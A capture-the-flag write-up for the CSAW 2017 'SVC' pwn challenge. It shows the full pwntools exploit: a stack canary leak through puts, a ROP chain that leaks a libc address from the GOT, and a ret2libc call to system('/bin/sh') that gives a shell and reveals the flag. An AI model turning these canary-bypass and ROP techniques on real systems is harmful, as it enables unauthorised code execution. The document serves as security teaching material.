# SVC Pwn 100

Let's take a look at the binary:

```
$	file svc 
svc: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8585d22b995d2e1ab76bd520f7826370df71e0b6, stripped
$	pwn checksec svc 
[*] '/Hackery/csaw17/svc/svc'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

So we can see it is a 64 bit elf, with a Stack Canary and a Non Executable stack. Let's run it and see what it does:

```
$	./svc 
-------------------------
[*]SCV GOOD TO GO,SIR....
-------------------------
1.FEED SCV....
2.REVIEW THE FOOD....
3.MINE MINERALS....
-------------------------
>>1
-------------------------
[*]SCV IS ALWAYS HUNGRY.....
-------------------------
[*]GIVE HIM SOME FOOD.......
-------------------------
>>15935728
-------------------------
[*]SCV GOOD TO GO,SIR....
-------------------------
1.FEED SCV....
2.REVIEW THE FOOD....
3.MINE MINERALS....
-------------------------
>>2
-------------------------
[*]REVIEW THE FOOD...........
-------------------------
[*]PLEASE TREAT HIM WELL.....
-------------------------
15935728
"`
-------------------------
[*]SCV GOOD TO GO,SIR....
-------------------------
1.FEED SCV....
2.REVIEW THE FOOD....
3.MINE MINERALS....
-------------------------
>>3
[*]BYE ~ TIME TO MINE MIENRALS...
```

So we can see that the binary gives us a menu with three options. The first appears to just scan input into memory. The second options appears to print out the data scanned into memory by the first option. The third option appears to just exit the binary.

Now that we have a basic understanding of what the binary does, and when we throw it in IDA we can see the following line of code under case 1 (the option where we scan in data into memory):

```
read_result = read(0, &input_buf, 0xF8uLL);
```

So we can see it is scanning in `0xf8` bytes into `input_bof`. When we look at the size of `input_buf` we can see that it only holds `0xa8` bytes. So we have a basic buffer overflow vulnerabillity here. However as soon as we start overflowing `input_bof`, we start overwriting the Stack Canary stored directly after that. So we need to leak the Stack Canary.

Looking at the case 2 (the second option from the elf) we can see what prints out our info:

```
puts(&input_buf);
``` 

So we can see that it prints out the memory that we scanned in using puts. Luckily for us, puts will print out all data untill it reaches a null terminator. What we can do, is we can fill our buffer up untill the stack canary, then print out our input. Stack canaries are null terminated, and because of how puts will print out the data (least significant byte first) we will need to overwrite the null terminator (which is the least significant byte of the canary) so puts doesn't stop at the null byte and not print out the stack canary. We should overwrite this byte with the newline chracter which is appended by the read call. 

When we do this, we will get the last seven bytes of the canary (the eighth byte is the null byte, so we know it and don't need to leak it) and other data untill there so happens to be a null byte. Because of the newline character, the canary will be on a line after the filler input, but we can just take that line, scan in the first seven bytes, append a null terminator to the end and we will have the canary.

Here is the code to leak the canary:

```
#Import pwntools
from pwn import *

#Establish the target process, and attack gdb
target = process("./svc")
#gdb.attach(target)

#Specify that the menu option to scan in data into memory
print target.recvuntil(">>")
target.sendline('1')
print target.recvuntil(">>")

#Send the payload, which will allow us to leak the canary
leak_payload = "0"*0xa8
target.sendline(leak_payload)
print target.recvuntil(">>")

#Select the second option, to print out our input and leak the canary
target.sendline('2')
print target.recvuntil("[*]PLEASE TREAT HIM WELL.....")
print target.recvline()
print target.recvline()
print target.recvline()

#Scan in, parse out, unpack, and print the stack canary
leak = target.recvline()
print len(leak)
canary = u64("\x00" + leak[0:7])
log.info("The Stack Canary is: " + hex(canary))

#drop to an interactive shell
target.interactive()
```

and when we run it:

```
$	python leak.py 
[+] Starting local process './svc': pid 5383
-------------------------
[*]SCV GOOD TO GO,SIR....
-------------------------
1.FEED SCV....
2.REVIEW THE FOOD....
3.MINE MINERALS....
-------------------------
>>
-------------------------
[*]SCV IS ALWAYS HUNGRY.....
-------------------------
[*]GIVE HIM SOME FOOD.......
-------------------------
>>
-------------------------
[*]SCV GOOD TO GO,SIR....
-------------------------
1.FEED SCV....
2.REVIEW THE FOOD....
3.MINE MINERALS....
-------------------------
>>
-------------------------
[*]REVIEW THE FOOD...........
-------------------------
[*]PLEASE TREAT HIM WELL.....


-------------------------

000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000

11
[*] The Stack Canary is: 0xb7c9c71e42c2ab00
[*] Switching to interactive mode
-------------------------
[*]SCV GOOD TO GO,SIR....
-------------------------
1.FEED SCV....
2.REVIEW THE FOOD....
3.MINE MINERALS....
-------------------------
>>$  
```

and when we look at what the stack canary is in gdb, we can see that we indeed have the correct stack canary. However when we leaked the canary, we did overwrite the least signifant byte (the null byte) with a newline character. Luckily for us, the the stack check happens when we exit the program (choose option three) since the menu just runs in a loop without calling sub functions with a stack canary check we need to worry about.

So now that we have a buffer overflow vuln that we can reach the return address, and the stack canary, we are able to get RCE. However we still need to figure out what to do with it. Looking at the list of imported functions in IDA we don't see system, however we can see `puts`. What we might be able to do is call `puts` with the GOT table address of puts, so it will print out the current address of puts in memory. With that we might be able to calculate the address of `system` and `/bin/sh` and call them. First we need to find the plt address of `puts`.

```
$	objdump -d svc | grep puts@plt
  4008a6:	74 05                	je     4008ad <puts@plt-0x23>
00000000004008c0 <puts@plt-0x10>:
00000000004008d0 <puts@plt>:
  4008db:	e9 e0 ff ff ff       	jmpq   4008c0 <puts@plt-0x10>
  4008eb:	e9 d0 ff ff ff       	jmpq   4008c0 <puts@plt-0x10>
  4008fb:	e9 c0 ff ff ff       	jmpq   4008c0 <puts@plt-0x10>
  40090b:	e9 b0 ff ff ff       	jmpq   4008c0 <puts@plt-0x10>
  40091b:	e9 a0 ff ff ff       	jmpq   4008c0 <puts@plt-0x10>
  40092b:	e9 90 ff ff ff       	jmpq   4008c0 <puts@plt-0x10>
  40093b:	e9 80 ff ff ff       	jmpq   4008c0 <puts@plt-0x10>
  40094b:	e9 70 ff ff ff       	jmpq   4008c0 <puts@plt-0x10>
  40095b:	e9 60 ff ff ff       	jmpq   4008c0 <puts@plt-0x10>
  40096b:	e9 50 ff ff ff       	jmpq   4008c0 <puts@plt-0x10>
  40097b:	e9 40 ff ff ff       	jmpq   4008c0 <puts@plt-0x10>
  40098b:	e9 30 ff ff ff       	jmpq   4008c0 <puts@plt-0x10>
  400d74:	e8 57 fb ff ff       	callq  4008d0 <puts@plt>
  400e6c:	e8 27 fa ff ff       	callq  400898 <puts@plt-0x38>
```

So we can see that the address that we need to call puts is `0x4008d0`. The next thing we need is the `GOT` address of puts, which should contain the libc address of puts when we print it:

```
	objdump -R svc | grep puts
0000000000602018 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5
```

So the `GOT` address of puts is `0x602018`. The last piece that we need in order to call puts is a ROP gadget which will pop the argument for puts (a pointer to the libc address of `puts`), and call the plt address of `puts`:

```
$ python ROPgadget.py --binary svc | grep pop
0x00000000004009fc : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret
0x00000000004009fe : add byte ptr [rax], al ; pop rbp ; ret
0x00000000004009ed : je 0x400a08 ; pop rbp ; mov edi, 0x602088 ; jmp rax
0x0000000000400a3b : je 0x400a50 ; pop rbp ; mov edi, 0x602088 ; jmp rax
0x00000000004009f8 : nop dword ptr [rax + rax] ; pop rbp ; ret
0x0000000000400a45 : nop dword ptr [rax] ; pop rbp ; ret
0x0000000000400e9c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400e9e : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400ea0 : pop r14 ; pop r15 ; ret
0x0000000000400ea2 : pop r15 ; ret
0x0000000000400a62 : pop rbp ; mov byte ptr [rip + 0x20188e], 1 ; ret
0x00000000004009ef : pop rbp ; mov edi, 0x602088 ; jmp rax
0x0000000000400e9b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400e9f : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000400a00 : pop rbp ; ret
0x0000000000400ea3 : pop rdi ; ret
0x0000000000400ea1 : pop rsi ; pop r15 ; ret
0x0000000000400e9d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004009fa : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret
```

Looking through the list of ROPgadgets (using ROPgadget) we can see a gadget which will work for us. The gadget at `0x400ea3` will pop our argument into the `rdi` register, then return which will allow us to call puts with an argument of our choice.

So now that we have the three pieces we need, we can call puts. When we look at the stack in IDA, we can see that the stack canary is stored at `rbp-0x0`. We can also see that the return address is stored at `rbp+0x8`. So we will need to have 8 bytes of filler after our canary to reach the return address, then we can write our rop gadget address followed by the got and the plt addresses for puts. Also we will need to rewrite the stack canary, since we did overwrite the null byte in it with a newline character. Here is the code for that (it is modified from the previous script).

```
#Import pwntools
from pwn import *

#Establish the target process, and attack gdb
target = process("./svc")
gdb.attach(target)
elf = ELF('svc')

#Establish the needed addresses
puts_got = 0x602018
puts_plt = 0x4008d0
gadget = 0x400ea3

log.info("puts_got is: " + hex(puts_got))
log.info("puts_plt is: " + hex(puts_plt))
log.info("gadget addr: " + hex(gadget))

#Specify that the menu option to scan in data into memory
print target.recvuntil(">>")
target.sendline('1')
print target.recvuntil(">>")

#Send the payload, which will allow us to leak the canary
leak_payload = "0"*0xa8
target.sendline(leak_payload)
print target.recvuntil(">>")

#Select the second option, to print out our input and leak the canary
target.sendline('2')
print target.recvuntil("[*]PLEASE TREAT HIM WELL.....")
print target.recvline()
print target.recvline()
print target.recvline()

#Scan in, parse out, unpack, and print the stack canary
leak = target.recvline()
print len(leak)
canary = u64("\x00" + leak[0:7])
log.info("The Stack Canary is: " + hex(canary))

#Specify that the menu option to scan in data into memory
print target.recvuntil(">>")
target.sendline('1')
print target.recvuntil(">>")

#Send the payload, which will allow us to leak the puts address
leak_payload = "0"*0xa8 + p64(canary) + "1"*8 + p64(gadget) + p64(puts_got) + p64(puts_plt)
target.sendline(leak_payload)
print target.recvuntil(">>")

#Se;ect the option to exit the loop, then scan in the address
target.sendline('3')
print target.recvuntil("[*]BYE ~ TIME TO MINE MIENRALS...\n")
puts_leak = target.recvline()
puts_leak = u64(puts_leak[0:6] + (8 - len(puts_leak[0:6]))*"\x00")
log.info("puts_leak: " + hex(puts_leak))


#drop to an interactive shell
target.interactive()
```

and when we run it:

```
$	python leak1.py
```

...

```
[*] puts_leak: 0x7febc7688920
[*] Switching to interactive mode
```

and when we check that address in gdb, we can see that we have the right address:

```
gdb-peda$ p puts
$2 = {<text variable, no debug info>} 0x7febc7688920 <_IO_puts>
```

So we can successfully leak a libc address to break aslr. Let's find the offsets from the libc address of `system` and `/bin/sh` to `puts`, so we can calculate the addresses of `system` and `/bin/sh` in our exploit:

```
gdb-peda$ p puts
$4 = {<text variable, no debug info>} 0x7febc7688920 <_IO_puts>
gdb-peda$ p system
$5 = {<text variable, no debug info>} 0x7febc765d6a0 <__libc_system>
gdb-peda$ find /bin/sh
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
libc : 0x7febc77a2c40 --> 0x68732f6e69622f ('/bin/sh')
```

and now onto python

```
>>> hex(0x7febc765d6a0 - 0x7febc7688920) 
'-0x2b280'
>>> hex(0x7febc77a2c40 - 0x7febc7688920) 
'0x11a320'
```

So the offset to system is `-0x2b280` and the offset to /bin/sh is `0x11a320`.  Let's test these offsets in our exploit to see if we can calculate those addresses:

Here is the modified script
```
#Import pwntools
from pwn import *

#Establish the target process, and attack gdb
target = process("./svc")
gdb.attach(target)
elf = ELF('svc')

#Establish the needed addresses
puts_got = 0x602018
puts_plt = 0x4008d0
gadget = 0x400ea3

log.info("puts_got is: " + hex(puts_got))
log.info("puts_plt is: " + hex(puts_plt))
log.info("gadget addr: " + hex(gadget))

#Specify that the menu option to scan in data into memory
print target.recvuntil(">>")
target.sendline('1')
print target.recvuntil(">>")

#Send the payload, which will allow us to leak the canary
leak_payload = "0"*0xa8
target.sendline(leak_payload)
print target.recvuntil(">>")

#Select the second option, to print out our input and leak the canary
target.sendline('2')
print target.recvuntil("[*]PLEASE TREAT HIM WELL.....")
print target.recvline()
print target.recvline()
print target.recvline()

#Scan in, parse out, unpack, and print the stack canary
leak = target.recvline()
print len(leak)
canary = u64("\x00" + leak[0:7])
log.info("The Stack Canary is: " + hex(canary))

#Specify that the menu option to scan in data into memory
print target.recvuntil(">>")
target.sendline('1')
print target.recvuntil(">>")

#Send the payload, which will allow us to leak the puts address
leak_payload = "0"*0xa8 + p64(canary) + "1"*8 + p64(gadget) + p64(puts_got) + p64(puts_plt)
target.sendline(leak_payload)
print target.recvuntil(">>")

#Se;ect the option to exit the loop, then scan in the address
target.sendline('3')
print target.recvuntil("[*]BYE ~ TIME TO MINE MIENRALS...\n")
puts_leak = target.recvline()
puts_leak = u64(puts_leak[0:6] + (8 - len(puts_leak[0:6]))*"\x00")
log.info("puts_leak: " + hex(puts_leak))

#Calculate the address of system and /bin/sh
system = puts_leak - 0x2b280
binsh = puts_leak + 0x11a320
log.info("system: " + hex(system))
log.info("binsh:  " + hex(binsh))

#drop to an interactive shell
target.interactive()
```

when we run it:

```
[*] puts_leak: 0x7f83bac8a920
[*] system: 0x7f83bac5f6a0
[*] binsh:  0x7f83bada4c40
[*] Switching to interactive mode
```

when we check those in gdb:

```
gdb-peda$ p puts
$1 = {<text variable, no debug info>} 0x7f83bac8a920 <_IO_puts>
gdb-peda$ p system
$2 = {<text variable, no debug info>} 0x7f83bac5f6a0 <__libc_system>
gdb-peda$ find /bin/sh
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
libc : 0x7f83bada4c40 --> 0x68732f6e69622f ('/bin/sh')
```

So we can see that we can successfully figure out the addresses of `/bin/sh` and `system`. We also have rce, and the stack canary. Now all we need to do is call `system` with the argument `/bin/sh`. We can do this in the same manner that we made the puts call. However before we do that, we will need to call main function again that, that ay we can write the new payload an run it. To grab that address, I just grabbed to first address from the assembly code for the main function in IDA.

and now putting it all together for our finished exploit:

```
#Import pwntools
from pwn import *

#Establish the target process, and attack gdb
target = process("./svc")
#gdb.attach(target)
elf = ELF('svc')

#Establish the needed addresses
puts_got = 0x602018
puts_plt = 0x4008d0
gadget = 0x400ea3
main = 0x400a96

log.info("puts_got is: " + hex(puts_got))
log.info("puts_plt is: " + hex(puts_plt))
log.info("gadget addr: " + hex(gadget))

#Specify that the menu option to scan in data into memory
print target.recvuntil(">>")
target.sendline('1')
print target.recvuntil(">>")

#Send the payload, which will allow us to leak the canary
leak_payload = "0"*0xa8
target.sendline(leak_payload)
print target.recvuntil(">>")

#Select the second option, to print out our input and leak the canary
target.sendline('2')
print target.recvuntil("[*]PLEASE TREAT HIM WELL.....")
print target.recvline()
print target.recvline()
print target.recvline()

#Scan in, parse out, unpack, and print the stack canary
leak = target.recvline()
print len(leak)
canary = u64("\x00" + leak[0:7])
log.info("The Stack Canary is: " + hex(canary))

#Specify that the menu option to scan in data into memory
print target.recvuntil(">>")
target.sendline('1')
print target.recvuntil(">>")

#Send the payload, which will allow us to leak the puts address
leak_payload = "0"*0xa8 + p64(canary) + "1"*8 + p64(gadget) + p64(puts_got) + p64(puts_plt) + p64(main)
target.sendline(leak_payload)
print target.recvuntil(">>")

#Se;ect the option to exit the loop, then scan in the address
target.sendline('3')
print target.recvuntil("[*]BYE ~ TIME TO MINE MIENRALS...\n")
puts_leak = target.recvline()
puts_leak = u64(puts_leak[0:6] + (8 - len(puts_leak[0:6]))*"\x00")
log.info("puts_leak: " + hex(puts_leak))

#Calculate the address of system and /bin/sh
system = puts_leak - 0x2b280
binsh = puts_leak + 0x11a320
log.info("system: " + hex(system))
log.info("binsh:  " + hex(binsh))

#Specify that the menu option to scan in data into memory
print target.recvuntil(">>")
target.sendline('1')
print target.recvuntil(">>")

#Send the payload, which will pop a shell for us
leak_payload = "0"*0xa8 + p64(canary) + "1"*8 + p64(gadget) + p64(binsh) + p64(system) 
target.sendline(leak_payload)
print target.recvuntil(">>")

#Send the menu option to return, and execute out payload
target.sendline("3")

#drop to an interactive shell
log.info("Enjoy your shell XD")
target.interactive()
```

when we run it:

```
$	python exploit.py
``` 

One wall of text later...

```
[*] Enjoy your shell XD
[*] Switching to interactive mode
[*]BYE ~ TIME TO MINE MIENRALS...
$ w
 01:28:42 up  1:56,  1 user,  load average: 1.04, 0.82, 0.75
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
guyinatu tty7     :0               23:33    1:56m  3:57   0.03s /bin/sh /usr/lib/gnome-session/run-systemd-session ubuntu-session.target
$ ls
core        leak0.py  peda-session-dash.txt     Readme.md
exploit.py  leak1.py  peda-session-svc.txt     svc
flag        leak2.py  peda-session-w.procps.txt
$ cat flag
flag{sCv_0n1y_C0st_50_M!n3ra1_tr3at_h!m_we11}
```

Just like that, we captured the flag!
